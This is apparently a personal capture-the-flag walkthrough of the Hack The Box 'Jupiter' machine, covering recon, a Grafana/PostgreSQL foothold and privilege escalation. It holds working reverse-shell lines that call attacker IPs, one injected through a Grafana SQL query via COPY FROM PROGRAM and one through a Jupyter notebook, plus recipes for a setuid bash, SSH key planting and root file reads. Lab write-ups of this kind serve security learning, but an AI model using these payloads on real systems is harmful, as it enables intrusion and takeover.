First scan

```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.216-jupiter/nmap]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -Pn -n 10.10.11.216 -oN allports
[sudo] password for cds: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 11:24 EDT
Nmap scan report for 10.10.11.216
Host is up (7.6s latency).
Not shown: 64013 filtered tcp ports (no-response), 1520 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

Services and script scan

```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.216-jupiter/nmap]
└─$ sudo nmap -p 22,80 -sVC 10.10.11.216 -oN targeted     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 11:26 EDT
Nmap scan report for 10.10.11.216
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 (ECDSA)
|_  256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://jupiter.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.42 seconds

```

sudo nano /etc/hosts

```
10.10.11.216  jupiter.htb
```

whatweb

```
http://jupiter.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.216], JQuery[3.3.1], PoweredBy[AI], Script, Title[Home | Jupiter], X-UA-Compatible[ie=edge], nginx[1.18.0]

```

wappalyzer

![[Screenshot_2023-09-21_11_38_56.png]]

launchpad ssh (probably)
OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 
[The Jammy Jellyfish](https://launchpad.net/ubuntu/jammy/+source/openssh) (supported)

Adress, mail, telephone

```
Los Angeles Gournadi, 1230 Bariasl
1-677-124-44227 • 1-688-356-66889
support@jupiter.htb
```
Names
```
Amanda stone
```


The website has a formulary

Some plugins on the source code
```
|   |
|---|
|<!-- Js Plugins -->|
||<script src="[js/jquery-3.3.1.min.js](http://jupiter.htb/js/jquery-3.3.1.min.js)"></script>|
||<script src="[js/bootstrap.min.js](http://jupiter.htb/js/bootstrap.min.js)"></script>|
||<script src="[js/jquery.magnific-popup.min.js](http://jupiter.htb/js/jquery.magnific-popup.min.js)"></script>|
||<script src="[js/mixitup.min.js](http://jupiter.htb/js/mixitup.min.js)"></script>|
||<script src="[js/masonry.pkgd.min.js](http://jupiter.htb/js/masonry.pkgd.min.js)"></script>|
||<script src="[js/jquery.slicknav.js](http://jupiter.htb/js/jquery.slicknav.js)"></script>|
||<script src="[js/owl.carousel.min.js](http://jupiter.htb/js/owl.carousel.min.js)"></script>|
||<script src="[js/main.js](http://jupiter.htb/js/main.js)"></script>|
```

Footer says this about colorlib

```
Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0
```


gobuster fuzzed directorys
```
/about.html           (Status: 200) [Size: 12613]
/contact.html         (Status: 200) [Size: 10141]
/index.html           (Status: 200) [Size: 19680]
/.html                (Status: 403) [Size: 162]
/img                  (Status: 301) [Size: 178] [--> http://jupiter.htb/img/]
/services.html        (Status: 200) [Size: 11969]
/css                  (Status: 301) [Size: 178] [--> http://jupiter.htb/css/]
/portfolio.html       (Status: 200) [Size: 11913]
/js                   (Status: 301) [Size: 178] [--> http://jupiter.htb/js/]
/fonts                (Status: 301) [Size: 178] [--> http://jupiter.htb/fonts/]
/Source               (Status: 301) [Size: 178] [--> http://jupiter.htb/Source/]
/.html                (Status: 403) [Size: 162]
/sass                 (Status: 301) [Size: 178] [--> http://jupiter.htb/sass/]

```



```
┌──(cds㉿kali)-[~/Documents/htb/10.10.11.216-jupiter/nmap]
└─$ ffuf -c -w /home/cds/Documents/text-resources/subdomains-top1million-20000.txt -u http://jupiter.htb -H "Host:FUZZ.jupiter.htb" -mc 200,204,302,307,401,403,405,500 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jupiter.htb
 :: Wordlist         : FUZZ: /home/cds/Documents/text-resources/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.jupiter.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 255ms]
    * FUZZ: kiosk

:: Progress: [19966/19966] :: Job [1/1] :: 129 req/sec :: Duration: [0:02:55] :: Errors: 0 ::

```


I found another website with ffuf http://kiosk.jupiter.htb/

```
┌──(cds㉿kali)-[~]
└─$ whatweb http://kiosk.jupiter.htb/
http://kiosk.jupiter.htb/ [200 OK] Country[RESERVED][ZZ], Grafana[9.5.2], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.216], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.18.0]

```

There is a login too http://kiosk.jupiter.htb/login


The site is made on grafana, what is this ?

Grafana es un software libre basado en licencia de Apache 2.0, ​ que permite la visualización y el formato de datos métricos. Permite crear cuadros de mando y gráficos a partir de múltiples fuentes, incluidas bases de datos de series de tiempo como Graphite, InfluxDB y OpenTSDB.​​ [Wikipedia](https://es.wikipedia.org/wiki/Grafana)

This is a little more info

```
default user:admin

Unless you have configured Grafana differently, it is set to use http://localhost:3000 by default. On the signin page, enter **admin** for username and password.
```

I find a edit panel, where you can query to the database , I dont know if there is some sensitive info or no 

http://kiosk.jupiter.htb/?orgId=1&editPanel=3&from=now-2d&to=now

![[Screenshot_2023-09-21_16_10_44.png]]

At this point I found a hash , of a user called Grafana. 

```
EXPLORING DBS

select schema_name from information_schema.schemata ; (dbs)

DBS:

pg_toast

pg_catalog

public

information_schema

TABLAS:

select table_name from information_schema.tables where table_schema = 'pg_catalog' ;

DB pg_catalog:

TABLAS:

pg_operator

pg_user

pg_group

Columnas de pg_user

usename

usesysid - 10 - 16385

select column_name from information_schema.columns where table_schema = 'pg_catalog' and table_name='pg_authid' ;

pg_catalog:<-DB

pg_authid <-TABLE

Columns de pg_authid:

oid

rolname

rolsuper

rolinherit

rolcreaterole

rolcreatedb

rolcanlogin

rolreplication

rolbypassrls

rolconnlimit

rolpassword

rolvaliduntil

hash

ID= 16385 Name=grafana_viewer PASSWORD=SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=
```

Finally... I was able to see that I was in a rabbit hole :( I tried to  identify the hash

```
I USED THIS:
hashcat --hash-identifier SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=

(of course is a postgresql hash)

AND THIS:
hashcat -m 28600 -a 0 /home/cds/Documents/htb/10.10.11.216-jupiter/content/hash.txt /usr/share/wordlists/rockyou.txt
```

I tried to change it for another hash, and then log in .. a deeper rabbit hole.

I used another tool to create my own password XD 

```
I create my own password with "scram-sha-256-master"

[https://github.com/supercaracal/scram-sha-256](https://github.com/supercaracal/scram-sha-256)

password

SCRAM-SHA-256$4096:zxn+CmT+L8pnbeylLzY8YA==$P4otz9kjaKGQ6kNBy+RF1Gxg6eUAPOzfWa7+pspaQDk=:BO5mFiJ6V82qw2crHUu+VBnv1wbIUBk3PiqDtu0SWhg=
```

And then I give up .

I take a few steps back . I intercept the petitions on kiosk.jupiter.htb and I see some interesting things. A petition was sended to `/api/ds/query` I used F12 on my browser and I inspect all the petitions, the headers sended and the responses. 

At this point I can see that in postgres there is a vulnerability CVE-2019-9193. For postgress this is not a vulnerability, you can investigate more. This permits us to do a RCE. So I intercepted the petition with burpsuit and y add my own petition, taking the headers and all that stuffs from the petitions that I can see investigating on the browser with F12.

```
POST /api/ds/query HTTP/1.1

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.6

Connection: keep-alive

Content-Length: 402

Host: kiosk.jupiter.htb

Origin: [http://kiosk.jupiter.htb](http://kiosk.jupiter.htb)

Referer: [http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d](http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d)

Sec-GPC: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36

accept: application/json, text/plain, */*

content-type: application/json

x-dashboard-uid: jMgFGfA4z

x-datasource-uid: YItSLg-Vz

x-grafana-org-id: 1

x-panel-id: 22

x-plugin-id: postgres

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.16.21/443 0>&1\"';",

"format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":364}],"range":{"from":"2023-10-11T07:15:04.367Z","to":"2023-10-11T13:15:04.368Z","raw":{"from":"now-6h","to":"now"}},"from":"1697008504367","to":"1697030104368"}
```

Of course first I was listening on my terminal with netcat.

### On the machine, as postgres ###

I have no capabilities and permisions as this user, but I was able to see some interesting files. At least on `/home` I was able to see that two users existed one called Juno and other called Jovian

I found some files 

`postgres@jupiter:/var/lib$ find / -user juno 2>/dev/null`

Here I found a file called `network-simulator` . I had the permisions to write on them so I changed some parameters.

```
server:

network_node_id: 0

processes:

- path: /usr/bin/cp

args: /bin/bash /tmp/bash

start_time: 3s

# three hosts with hostnames 'client1', 'client2', and 'client3'

client:

network_node_id: 0

quantity: 3

processes:

- path: /usr/bin/chmod

args: u+s /tmp/bash

start_time: 5s

ssh-keygen

ssh -i id_rsa juno@10.10.11.216
```
I copy the bash file to the /tmp/ folder , and on the second step I added permissions and I was able to execute a privileged bash as Juno 

`./bash -p`

and when I put 

```
kali> whoami
Juno
```


### As Juno


I get on the folder home but I wasn't able to read the user flag.

I tried to put my ssh credentials to come inside of the machine

`I removed the authorized_keys file` 

On my machine:

`Keygen-rsa`

Then I copied my own id_rsa.pub to the victim machine and I changed the name to "authorized_keys"

(Use python server or netcat to translate the id_rsa.pub generated on your own machine to the victim's machine)

and finally I used on my machine `ssh -i id_rsa juno@10.10.11.216` 
And I finally read cat the user flag.

I used `netstat -nptl` and I was able to see that a port number 127.0.0.1:8888 was running on this machine.

Then I used `ssh -i id_rsa -L 8888:127.0.0.1:8888 juno@10.10.11.216`
And on my machine I was able to use the port 8888 of that machine as mine on my local machine.

So when i get to the 127.0.0.1:8888 on my browser I was able to see a "Jupiter" log in. Jupiter is some framework that scientists  use to take notes. I need a token to come inside. 

Juno was in a group called "science"

```
juno@jupiter:~$ id

uid=1000(juno) gid=1000(juno) groups=1000(juno),1001(science)

```

I tried to see some files on the machine to find the token.

```
/opt/solar-flares

/opt/solar-flares/flares.csv

/opt/solar-flares/xflares.csv

/opt/solar-flares/map.jpg

/opt/solar-flares/start.sh

/opt/solar-flares/logs

/opt/solar-flares/logs/jupyter-2023-03-10-25.log

/opt/solar-flares/logs/jupyter-2023-03-08-37.log

/opt/solar-flares/logs/jupyter-2023-03-08-38.log

/opt/solar-flares/logs/jupyter-2023-03-08-36.log

/opt/solar-flares/logs/jupyter-2023-03-09-11.log

/opt/solar-flares/logs/jupyter-2023-03-09-24.log

/opt/solar-flares/logs/jupyter-2023-03-08-14.log

/opt/solar-flares/logs/jupyter-2023-03-09-59.log

/opt/solar-flares/flares.html

/opt/solar-flares/cflares.csv

/opt/solar-flares/flares.ipynb

/opt/solar-flares/.ipynb_checkpoints

/opt/solar-flares/mflares.csv
```

Investigating there after trying some tokens from the logs I found the right one  here:

`/opt/solar-flares/logs/jupyter-2023-03-09-59.log`

Now I created a new **ipynb** file and I put this payload

`import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.16.86/5555 0>&1"');`

And now I was loged as Jovian


### Jovian 


Now I used sudo -l , I was able to use a binary called `sattrack`

When I executed it , I recived a message about a configuration file that the binary cant find.

I used `strings stattrack | grep -i config `

and the binary was using a file called `/tmp/config.json.`


So now  I look for it in the filesystem and I copy it in the `/tmp` folder

```
find / -name config.json 2>/dev/null
cp /usr/local/share/sattrack/config.json /tmp
```

Now by running the sattrack executable as root we can see that it’s able to download in the working directory any file specified in a particular section of the `config.json` file. Let’s try to exploit this feature by requesting the `root.txt` we want to read.

```
nano config.json
```

Find `tlesources` section and replace any of the 3 url with `file:///root/root.txt` as shown below

```
"tlesources":[
    "file:///root/root.txt",
    "http://celestrak.org/NORAD/elements/n...",
    "http://celestrak.org/NORAD/elements/g..."
],
```
 
I save the new `config.json` and simply run sattrack as root. 

```
sudo /usr/local/bin/sattrack
cat /tmp/tle/root.txt
```

And finally I can see the flag  !!!!!!!!!!!!!!         